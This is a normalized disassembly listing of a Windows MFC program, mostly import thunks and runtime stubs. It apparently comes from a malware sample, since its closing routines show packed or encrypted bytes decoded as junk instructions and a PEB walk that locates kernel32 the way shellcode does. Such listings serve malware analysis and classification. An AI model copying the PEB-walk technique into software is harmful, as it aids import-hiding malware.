jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_554
jmp [ Ordinal_MFC42_554@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_807
jmp [ Ordinal_MFC42_807@IAT ]
Ordinal_MFC42_2494
jmp [ Ordinal_MFC42_2494@IAT ]
Ordinal_MFC42_2627
jmp [ Ordinal_MFC42_2627@IAT ]
Ordinal_MFC42_2626
jmp [ Ordinal_MFC42_2626@IAT ]
Ordinal_MFC42_6000
jmp [ Ordinal_MFC42_6000@IAT ]
Ordinal_MFC42_2117
jmp [ Ordinal_MFC42_2117@IAT ]
Ordinal_MFC42_4163
jmp [ Ordinal_MFC42_4163@IAT ]
Ordinal_MFC42_6625
jmp [ Ordinal_MFC42_6625@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_4615
jmp [ Ordinal_MFC42_4615@IAT ]
Ordinal_MFC42_4612
jmp [ Ordinal_MFC42_4612@IAT ]
Ordinal_MFC42_4610
jmp [ Ordinal_MFC42_4610@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
Ordinal_MFC42_617
jmp [ Ordinal_MFC42_617@IAT ]
Ordinal_MFC42_5301
jmp [ Ordinal_MFC42_5301@IAT ]
Ordinal_MFC42_5214
jmp [ Ordinal_MFC42_5214@IAT ]
Ordinal_MFC42_296
jmp [ Ordinal_MFC42_296@IAT ]
Ordinal_MFC42_986
jmp [ Ordinal_MFC42_986@IAT ]
Ordinal_MFC42_520
jmp [ Ordinal_MFC42_520@IAT ]
Ordinal_MFC42_4159
jmp [ Ordinal_MFC42_4159@IAT ]
Ordinal_MFC42_6117
jmp [ Ordinal_MFC42_6117@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_4696
jmp [ Ordinal_MFC42_4696@IAT ]
Ordinal_MFC42_3058
jmp [ Ordinal_MFC42_3058@IAT ]
Ordinal_MFC42_3065
jmp [ Ordinal_MFC42_3065@IAT ]
Ordinal_MFC42_6336
jmp [ Ordinal_MFC42_6336@IAT ]
Ordinal_MFC42_2510
jmp [ Ordinal_MFC42_2510@IAT ]
Ordinal_MFC42_2542
jmp [ Ordinal_MFC42_2542@IAT ]
Ordinal_MFC42_5243
jmp [ Ordinal_MFC42_5243@IAT ]
Ordinal_MFC42_5740
jmp [ Ordinal_MFC42_5740@IAT ]
Ordinal_MFC42_1746
jmp [ Ordinal_MFC42_1746@IAT ]
Ordinal_MFC42_5577
jmp [ Ordinal_MFC42_5577@IAT ]
Ordinal_MFC42_3172
jmp [ Ordinal_MFC42_3172@IAT ]
Ordinal_MFC42_5653
jmp [ Ordinal_MFC42_5653@IAT ]
Ordinal_MFC42_4420
jmp [ Ordinal_MFC42_4420@IAT ]
Ordinal_MFC42_4953
jmp [ Ordinal_MFC42_4953@IAT ]
Ordinal_MFC42_4858
jmp [ Ordinal_MFC42_4858@IAT ]
Ordinal_MFC42_2399
jmp [ Ordinal_MFC42_2399@IAT ]
Ordinal_MFC42_4387
jmp [ Ordinal_MFC42_4387@IAT ]
Ordinal_MFC42_3454
jmp [ Ordinal_MFC42_3454@IAT ]
Ordinal_MFC42_3198
jmp [ Ordinal_MFC42_3198@IAT ]
Ordinal_MFC42_6080
jmp [ Ordinal_MFC42_6080@IAT ]
Ordinal_MFC42_6175
jmp [ Ordinal_MFC42_6175@IAT ]
Ordinal_MFC42_4623
jmp [ Ordinal_MFC42_4623@IAT ]
Ordinal_MFC42_4426
jmp [ Ordinal_MFC42_4426@IAT ]
Ordinal_MFC42_338
jmp [ Ordinal_MFC42_338@IAT ]
Ordinal_MFC42_652
jmp [ Ordinal_MFC42_652@IAT ]
Ordinal_MFC42_4823
jmp [ Ordinal_MFC42_4823@IAT ]
Ordinal_MFC42_4614
jmp [ Ordinal_MFC42_4614@IAT ]
Ordinal_MFC42_4613
jmp [ Ordinal_MFC42_4613@IAT ]
Ordinal_MFC42_4589
jmp [ Ordinal_MFC42_4589@IAT ]
Ordinal_MFC42_4899
jmp [ Ordinal_MFC42_4899@IAT ]
Ordinal_MFC42_5076
jmp [ Ordinal_MFC42_5076@IAT ]
Ordinal_MFC42_4341
jmp [ Ordinal_MFC42_4341@IAT ]
Ordinal_MFC42_4349
jmp [ Ordinal_MFC42_4349@IAT ]
Ordinal_MFC42_4723
jmp [ Ordinal_MFC42_4723@IAT ]
Ordinal_MFC42_4890
jmp [ Ordinal_MFC42_4890@IAT ]
Ordinal_MFC42_4531
jmp [ Ordinal_MFC42_4531@IAT ]
Ordinal_MFC42_4545
jmp [ Ordinal_MFC42_4545@IAT ]
Ordinal_MFC42_4543
jmp [ Ordinal_MFC42_4543@IAT ]
Ordinal_MFC42_4526
jmp [ Ordinal_MFC42_4526@IAT ]
Ordinal_MFC42_4529
jmp [ Ordinal_MFC42_4529@IAT ]
Ordinal_MFC42_4524
jmp [ Ordinal_MFC42_4524@IAT ]
Ordinal_MFC42_4964
jmp [ Ordinal_MFC42_4964@IAT ]
Ordinal_MFC42_4961
jmp [ Ordinal_MFC42_4961@IAT ]
Ordinal_MFC42_4108
jmp [ Ordinal_MFC42_4108@IAT ]
Ordinal_MFC42_5240
jmp [ Ordinal_MFC42_5240@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3748
jmp [ Ordinal_MFC42_3748@IAT ]
Ordinal_MFC42_1726
jmp [ Ordinal_MFC42_1726@IAT ]
Ordinal_MFC42_4432
jmp [ Ordinal_MFC42_4432@IAT ]
Ordinal_MFC42_560
jmp [ Ordinal_MFC42_560@IAT ]
Ordinal_MFC42_813
jmp [ Ordinal_MFC42_813@IAT ]
Ordinal_MFC42_5260
jmp [ Ordinal_MFC42_5260@IAT ]
Ordinal_MFC42_2535
jmp [ Ordinal_MFC42_2535@IAT ]
Ordinal_MFC42_4224
jmp [ Ordinal_MFC42_4224@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_404390
cmp [ rwxdata ] 0xffffffff
jne rwxdata
push rwxdata
push rwxdata
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_4043bc
push [ esp + 0x4 ]
call sub_404390
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_404551
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_404570
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_404582
xor eax eax
retn
sub_404585
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_404592
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_4045d8
jmp sub_4045d8
sub_4045d8
push 0x600
push 0x0
call sub_4045aa
mov [ rwxdata ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_404600
mov eax [ ebp - 0x10 ]
push eax
call sub_403220
retn
sub_40460a
mov eax rwxdata
jmp __CxxFrameHandler
sub_404620
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_404628
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_404636
mov eax rwxdata
jmp __CxxFrameHandler
sub_404640
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_404648
mov ecx [ ebp - 0x10 ]
add ecx 0xc0
jmp Ordinal_MFC42_796
sub_404656
mov eax rwxdata
jmp __CxxFrameHandler
sub_404660
mov eax [ ebp - 0x34 ]
push eax
call sub_403220
retn
sub_40466a
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_617
sub_404672
mov eax rwxdata
jmp __CxxFrameHandler
sub_404680
lea ecx [ ebp - 0x6c ]
jmp sub_403460
sub_404688
mov eax rwxdata
jmp __CxxFrameHandler
sub_4046a0
mov eax [ ebp - 0x10 ]
push eax
call sub_403220
retn
sub_4046aa
mov eax rwxdata
jmp __CxxFrameHandler
sub_4046c0
mov eax [ ebp - 0x10 ]
push eax
call sub_403220
retn
sub_4046ca
mov eax rwxdata
jmp __CxxFrameHandler
sub_404723
jmp [ eax ]
sub_404837
[ edi + ecx ]
sub_404cbb
sar [ esi - 0x635e4060 ] 0x9b
pushfd
fwait
xchg ecx eax

sub_404dc2
push esi
adc al 0xa5
insd
outsb
outsb
mov eax [ 0x7a9191e4 ]
out dx al
iretd
sub_404fc8
sbb dl [ edi + 0x69dd492 ]
sbb cl [ esi - 0x3a ]
mov [ 0x6ce43f51 ] eax
iretd
sub_40501d
adc dl [ edi - 0x6b ]
adc dl ah
insd
nop
jpe rwxdata
0x58cf
iretd
sub_405044
into
0x58cf
sub_409bb4
mov esi [ fs : 0x30 ]
mov esi [ esi + 0xc ]
mov esi [ esi + 0x1c ]
mov edx [ esi + 0x8 ]
mov edi [ esi + 0x20 ]
mov esi [ esi ]
cmp [ edi + 0xc ] 0x320033
jne rwxdata
mov [ ebp - 0x4c1 ] edx
retn
